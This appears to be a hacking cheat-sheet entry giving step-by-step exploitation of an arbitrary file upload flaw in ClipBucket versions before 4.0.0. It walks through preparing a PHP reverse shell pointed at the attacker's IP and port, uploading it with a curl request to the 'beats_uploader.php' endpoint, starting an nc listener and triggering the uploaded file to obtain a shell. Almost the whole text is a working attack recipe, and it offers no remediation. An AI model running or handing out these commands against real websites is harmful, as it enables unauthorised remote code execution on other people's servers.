## Arbitrary File Upload < v4.0.0

ClipBucket versions before 4.0.0 is vulnerable to file upload in ‘uploader’ actions. We can upload arbitrary files so we can execute reverse shell.

### 1. Prepare Payload

Create a PHP script to reverse shell in local machine.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```

Update $ip and $port with your local ip address and port.

### 2. Upload the Payload

Next upload the above PHP script to the target website.

```bash
curl -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "https://example.com/actions/beats_uploader.php"
```

### 3. Reverse Shell

In local machine, start a listener.

```bash
nc -lvnp 4444
```

Then access to **`https://example.com/actions/CB_BEATS_UPLOAD_DIR/<uploaded_filename>.php`**.  
We should get a shell.
